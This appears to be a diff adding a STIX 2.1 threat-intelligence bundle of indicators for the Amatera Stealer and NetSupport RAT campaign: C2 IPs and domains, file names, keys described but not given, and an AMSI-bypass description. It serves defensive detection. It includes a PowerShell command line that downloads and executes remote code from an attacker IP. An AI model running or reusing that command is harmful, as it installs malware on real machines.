@@ -1,0 +1,131 @@
+{
+  "type": "bundle",
+  "id": "bundle--afd7c43c-cdf4-4bc2-a08e-a3c56cc80e47",
+  "spec_version": "2.1",
+  "objects": [
+    {
+      "type": "file",
+      "id": "file--97dec6bd-6e4a-4a90-a4d8-b994bd01988b",
+      "name": "mshta.exe",
+      "path": "C:\\Windows\\System32\\mshta.exe"
+    },
+    {
+      "type": "file",
+      "id": "file--faaf61d5-aaf0-4b9c-affb-ee9d3591274d",
+      "name": "mshta.exe",
+      "path": "C:\\Windows\\Syswow64\\mshta.exe"
+    },
+    {
+      "type": "file",
+      "id": "file--608e3ac4-4e31-413c-979d-c7a4e6ee846a",
+      "name": "client32.ini",
+      "description": "NetSupport Manager configuration file containing C2 server address."
+    },
+    {
+      "type": "file",
+      "id": "file--24f63f3d-dc9f-4d8e-98b4-ba5654eefed5",
+      "name": "NSM.lic",
+      "description": "NetSupport Manager license file; observed with licensee 'KAKAN' in EVALUSION cluster."
+    },
+    {
+      "type": "file",
+      "id": "file--f1f8c690-7f6f-4c7e-a798-99a23022aa3f",
+      "name": "systeminfo.exe",
+      "description": "Observed as the executed NetSupport client payload in Amatera attack chain."
+    },
+    {
+      "type": "file",
+      "id": "file--4b99b25a-b90b-452b-b40d-249b14da9fc5",
+      "name": "zip archive",
+      "description": "Archive containing harvested files and standard output from PowerShell-specific commands, exfiltrated to C2."
+    },
+    {
+      "type": "file",
+      "id": "file--ec44fb1f-9039-403e-aa20-cf38120daf46",
+      "name": "<guid>.txt",
+      "description": "Text file at the root of exfiltrated zip archive, storing victim device fingerprint in the format <timestamp><computer_name><machine guid>."
+    },
+    {
+      "type": "file",
+      "id": "file--ec1a871d-404b-46a7-8409-fff43c1f0ce7",
+      "name": "clr.dll",
+      "description": "Windows CLR DLL; targeted by PowerShell stage to overwrite 'AmsiScanBuffer' string in memory to disable AMSI scanning."
+    },
+    {
+      "type": "file",
+      "id": "file--b57f5d48-6ef8-45f7-b846-7e8dd0e95809",
+      "name": "payload.ps1",
+      "description": "PowerShell script file written to disk and executed as part of Amatera loader functionality."
+    },
+    {
+      "type": "file",
+      "id": "file--48b50015-b1c2-43b7-82cf-5a4b55f0010a",
+      "name": "payload.exe",
+      "description": "Executable file written to disk and executed as part of Amatera loader functionality."
+    },
+    {
+      "type": "file",
+      "id": "file--aa41fad7-4044-4dbe-8b99-74080977f8b2",
+      "name": "Encrypted JPG",
+      "description": "JPG file downloaded by PowerShell, containing encrypted/compressed NetSupport RAT-laced zip archive."
+    },
+    {
+      "type": "url",
+      "id": "url--4190144d-e99b-462e-bb3b-c1bd2712fca3",
+      "value": "hxxp://87.120.219.26/P9m4H7S2FqDTof"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--791bf691-4e7c-4599-959d-099850c589a4",
+      "value": "87.120.219.26"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--47db2eca-adc2-40ac-966d-55ce0612dcbf",
+      "value": "45.94.47.224"
+    },
+    {
+      "type": "ipv4-addr",
+      "id": "ipv4-addr--3f23792c-a713-4aaa-b199-f18d3ee2973c",
+      "value": "91.98.229.246"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--77608c47-d1fb-4844-b9e4-6aef3e286573",
+      "value": "aether100pronotification.table.core.windows.net"
+    },
+    {
+      "type": "domain-name",
+      "id": "domain-name--3afb6589-b97d-4a32-911d-92ab6af6f1a6",
+      "value": "aether100.pronotification.table.core.windows.net"
+    },
+    {
+      "type": "process",
+      "id": "process--2cc01c33-9180-4cb1-907d-3dde86efaeeb",
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('hxxp://87.120.219.26/P9m4H7S2FqDTof')\""
+    },
+    {
+      "type": "process",
+      "id": "process--68a84905-0200-4ea7-970e-f99cf34072d3",
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"<Path/To/Payload.ps1>\""
+    },
+    {
+      "type": "cryptographic-key",
+      "id": "cryptographic-key--d12b6f25-0e27-42d1-b1ce-76f8c7c2140b",
+      "description": "AES-256 CBC key used in Amatera Stealer C2 communications; 32-byte key stored in payload as a byte array on the stack."
+    },
+    {
+      "type": "cryptographic-key",
+      "id": "cryptographic-key--2d1a61d2-a4b2-4679-899e-3e732cedc30e",
+      "description": "RC2 key used to decrypt encrypted payloads downloaded by the .NET-based downloader packed with Agile.net."
+    },
+    {
+      "type": "software",
+      "id": "software--c8e09853-0d91-4a66-b572-6188bca2adae",
+      "name": "Agile.net",
+      "description": ".NET packer used to pack the downloader for Amatera Stealer."
+    }
+  ]
+}
